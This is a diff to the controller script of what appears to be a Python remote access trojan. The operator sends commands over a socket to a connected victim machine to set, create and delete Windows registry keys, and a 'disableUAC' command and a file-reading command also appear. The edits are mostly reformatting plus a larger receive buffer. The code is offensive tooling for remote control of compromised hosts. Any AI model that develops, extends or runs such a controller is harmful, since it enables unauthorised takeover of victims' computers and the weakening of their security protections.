@@ -155,24 +155,23 @@ readfile <file>           read from file
 
             elif command == 'setvalue':
                 client.send(command.encode())
-                const = str(input(
-                    "Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
-                root = str(
-                    input('Enter the path to store key [ex. SOFTWARE\\test]: '))
+
+                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
+                root = str(input('Enter the path to store key [ex. SOFTWARE\\test]: '))
                 key = str(input('Enter the key name: '))
-                value = str(
-                    input('Enter the value of key [None, 0, 1, 2 etc.]: '))
+                value = str(input('Enter the value of key [None, 0, 1, 2 etc.]: '))
+
                 client.send(const.encode())
                 client.send(root.encode())
                 client.send(key.encode())
                 client.send(value.encode())
-                result_output = client.recv(1024).decode()
+                result_output = client.recv(2048).decode()
+                
                 print(result_output)
 
             elif command == 'delkey':
                 client.send(command.encode())
-                const = str(input(
-                    "Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
+                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                 root = str(input('Enter the path to key: '))
                 client.send(const.encode())
                 client.send(root.encode())
@@ -181,12 +180,11 @@ readfile <file>           read from file
 
             elif command == 'createkey':
                 client.send(command.encode())
-                const = str(input(
-                    "Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
+                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                 root = str(input('Enter the path to key: '))
                 client.send(const.encode())
                 client.send(root.encode())
-                result_output = client.recv(1024).decode()
+                result_output = client.recv(2048).decode()
                 print(result_output)
 
             elif command == 'disableUAC':
